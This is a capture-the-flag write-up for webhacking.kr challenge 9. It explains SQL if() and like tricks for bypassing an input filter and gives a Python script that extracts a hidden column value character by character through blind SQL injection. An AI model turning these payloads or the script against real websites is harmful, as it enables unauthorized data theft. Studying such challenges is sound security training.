---
title: Webhacking.kr 9 Write-Up
description: Another SQL injection problem.
category: web
date: 1690156800000
---

## Important things I learnt

_SQL if statement_

`if(A, B, C)` if A is true, returns B or returns C.

_like()_ _operator_

`like()` operator is the same as `=`.

`_database()_` function

This function returns the current database’s name.

## Understanding

_1. SQL Injections Filtering_

![some text](/illustrations/webhacking.kr-9/image-1.png)

Clicking on the `3` link, I got an image like this:

![Alt text](/illustrations/webhacking.kr-9/image-2.png)

I tried some basic SQL injections but failed.

`1or1=1` , etc.

## Exploitation

I tried this SQL injection, `if(length(id)like(5),1,99)`. And it worked!

![Alt text](/illustrations/webhacking.kr-9/image-3.png)

This SQL statement does two things:

1. Finding every row with the **5**-length `id` column.
2. AND finding the value with `no=1`.

So, if I want to get `banana` on the page, I can use an SQL injection like this:

`if(length(id)like(6),2,99)`

By using this, I can get the No. 3’s length and its contents.

```python
import requests

headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) \
            AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117'}
cookies = {'PHPSESSID':'1'}
keyword = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'

length = -1
result = ""

for i in range(1,200):
  url = f'https://webhacking.kr/challenge/web-09/?no=if(length(id)like({i}),3,99)'
  res = requests.get(url, headers=headers, cookies=cookies)
  if "Secret" in res.text:
    length = i
    break

print("Length", length)

for i in range(1, length+1):
  for key in keyword:
    url = f'https://webhacking.kr/challenge/web-09/?no=if(substr(id,{i},1)like({hex(ord(key))}),3,99)'
    res = requests.get(url, headers=headers, cookies=cookies)
    if "Secret" in res.text:
      result += key
      break

print(result)
```
